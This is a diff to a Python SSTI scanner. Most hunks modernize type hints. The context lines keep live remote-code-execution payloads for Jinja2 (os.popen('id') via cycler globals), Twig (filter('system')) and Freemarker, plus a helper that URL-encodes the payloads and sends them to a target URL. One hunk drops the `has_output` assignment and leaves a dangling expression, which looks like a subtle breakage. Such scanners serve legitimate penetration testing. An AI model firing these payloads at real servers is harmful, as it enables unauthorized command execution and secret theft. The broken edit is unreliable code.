@@ -7,7 +7,6 @@ import json
 import logging
 import sys
 import urllib.parse
-from typing import List, Optional
 
 try:
     import requests
@@ -36,7 +35,7 @@ ENGINE_FINGERPRINTS = {
 
 
 def test_ssti_detection(url: str, param: str, method: str = "GET",
-                         headers: Optional[dict] = None) -> List[dict]:
+                         headers: dict | None = None) -> list[dict]:
     """Test all detection payloads against a parameter."""
     results = []
     for engine, test in DETECTION_PAYLOADS.items():
@@ -57,7 +56,7 @@ def test_ssti_detection(url: str, param: str, method: str = "GET",
 
 
 def identify_engine(url: str, param: str, method: str = "GET",
-                     headers: Optional[dict] = None) -> dict:
+                     headers: dict | None = None) -> dict:
     """Identify the specific template engine in use."""
     import re
 
@@ -83,7 +82,7 @@ def identify_engine(url: str, param: str, method: str = "GET",
 
 
 def test_jinja2_rce(url: str, param: str, method: str = "GET",
-                     headers: Optional[dict] = None) -> List[dict]:
+                     headers: dict | None = None) -> list[dict]:
     """Test Jinja2 RCE payloads."""
     payloads = [
         {"name": "cycler_popen", "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}"},
@@ -94,7 +93,7 @@ def test_jinja2_rce(url: str, param: str, method: str = "GET",
     results = []
     for p in payloads:
         resp = _send_payload(url, param, p["payload"], method, headers)
-        has_output = (
+        (
             "uid=" in resp.text or "SECRET_KEY" in resp.text or
             "root" in resp.text or len(resp.text) > 500
         )
@@ -110,7 +109,7 @@ def test_jinja2_rce(url: str, param: str, method: str = "GET",
 
 
 def test_twig_rce(url: str, param: str, method: str = "GET",
-                   headers: Optional[dict] = None) -> List[dict]:
+                   headers: dict | None = None) -> list[dict]:
     """Test Twig (PHP) RCE payloads."""
     payloads = [
         {"name": "filter_system", "payload": "{{['id']|filter('system')}}"},
@@ -130,7 +129,7 @@ def test_twig_rce(url: str, param: str, method: str = "GET",
 
 
 def test_freemarker_rce(url: str, param: str, method: str = "GET",
-                         headers: Optional[dict] = None) -> List[dict]:
+                         headers: dict | None = None) -> list[dict]:
     """Test Freemarker (Java) RCE payloads."""
     payloads = [
         {"name": "execute_class",
@@ -149,7 +148,7 @@ def test_freemarker_rce(url: str, param: str, method: str = "GET",
 
 
 def _send_payload(url: str, param: str, payload: str, method: str = "GET",
-                   headers: Optional[dict] = None) -> requests.Response:
+                   headers: dict | None = None) -> requests.Response:
     h = headers or {}
     encoded = urllib.parse.quote(payload)
     try:
